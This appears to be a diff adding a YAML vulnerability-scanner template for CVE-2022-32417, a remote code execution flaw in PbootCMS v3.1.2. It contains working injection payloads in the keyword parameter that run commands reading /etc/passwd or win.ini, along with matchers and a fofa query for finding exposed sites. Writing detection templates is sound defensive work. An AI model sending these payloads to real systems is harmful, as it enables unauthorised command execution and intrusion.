@@ -1,0 +1,41 @@
+id: pbootcms-index-keyword-rce
+info:
+  name: pbootcms-index-keyword-rce
+  author: leadlife
+  severity: critical
+  description: PbootCMS是PbootCMS个人开发者的一款使用PHP语言开发的开源企业建站内容管理系统（CMS）。 PbootCMS v3.1.2版本存在安全漏洞，该漏洞源于unction.php 中的函数 parserIfLabel存在安全问题。如果被攻击者利用，可直接getshell；可被用于内网信息收集，扫描目标内网主机；可攻击运行在内网或本地的应用程序；可被用作攻击跳板；
+  reference: 
+    - changting
+    - https://github.com/zan8in/afrog/blob/81501b69981536dda20d76c2e889169bec9c02b3/pocs/afrog-pocs/CVE/2022/CVE-2022-32417.yaml#L19
+  classification:
+    cve-id: CVE-2022-32417
+  metadata:
+    verified: true
+    fofa-query: app="PBOOTCMS"
+    repair: 可对危险函数进行过滤，使用 waf 等等安全产品进行防护
+  tags: pbootcms,rce
+
+http:
+  - raw:
+      - |
+        GET /index.php?keyword=}{pboot:if(get_lg/*&*/()/*&*/(get_backurl/*&*/()))}data{/pboot:if}&backurl=;cat%20/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: lg=system
+
+      - |
+        GET /index.php?keyword=}{pboot:if(get_lg/*&*/()/*&*/(get_backurl/*&*/()))}data{/pboot:if}&backurl=;type%20C:\\Windows\\win.ini HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: lg=system
+  
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
